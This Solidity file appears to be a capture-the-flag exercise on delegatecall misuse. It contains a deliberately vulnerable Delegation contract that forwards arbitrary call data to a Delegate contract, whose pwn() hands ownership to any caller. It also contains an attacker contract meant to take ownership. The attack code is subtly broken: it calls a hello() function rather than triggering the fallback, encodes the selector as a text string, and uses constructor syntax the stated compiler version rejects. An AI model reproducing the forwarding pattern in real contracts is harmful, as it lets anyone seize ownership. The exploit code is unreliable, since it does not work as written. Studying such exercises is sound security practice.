// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract hackDelegation{
    Delegation d;

    function setAddr(address _addr) external{
        d = Delegation(_addr);
    }

    function callFallBack() external{
        d.hello(abi.encodePacked('0xdd365b8b'));
    }

}
contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  function hello(bytes memory x) public{

  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
